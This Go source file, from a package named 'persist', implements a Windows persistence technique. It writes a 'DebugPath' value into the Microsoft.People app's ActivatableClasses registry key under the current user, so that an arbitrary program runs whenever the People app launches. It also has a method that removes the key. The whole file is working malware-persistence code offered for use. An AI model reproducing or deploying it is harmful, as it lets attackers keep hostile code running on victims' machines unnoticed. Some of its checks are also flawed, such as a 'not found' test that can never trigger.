// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package persist

import (
	"errors"
	"io"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

type ExecutorPeople struct{}

func (e ExecutorPeople) findKey() (string, error) {
	nk, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Classes\\ActivatableClasses\\Package", registry.READ)
	if err != nil {
		return "<nil>", err
	}
	defer nk.Close()
	subkeys, err := nk.ReadSubKeyNames(2)
	if err != nil && err != io.EOF {
		return "<nil>", err
	}
	n := 0
	for i := range subkeys {
		if strings.Contains(subkeys[i], "Microsoft.People_") {
			n = i
		}
	}
	if n < 0 {
		return "<nil>", errors.New("cannot find key which contains Microsoft.People_")
	}
	key := filepath.Join("Software\\Classes\\ActivatableClasses\\Package",
		subkeys[n], "DebugInformation\\x4c7a3b7dy2188y46d4ya362y19ac5a5805e5x.AppX368sbpk1kx658x0p332evjk2v0y02kxp.mca")
	return key, nil
}

func (e ExecutorPeople) Exec(path string) error {
	kpath, err := e.findKey()
	if err != nil {
		return err
	}
	k, exists, err := registry.CreateKey(registry.CURRENT_USER, kpath, registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}
	defer k.Close()
	err = k.SetStringValue("DebugPath", path)
	return err
}

func (e ExecutorPeople) Revert() error {
	kpath, err := e.findKey()
	if err != nil {
		return err
	}
	err = registry.DeleteKey(registry.CURRENT_USER, kpath)
	return err
}
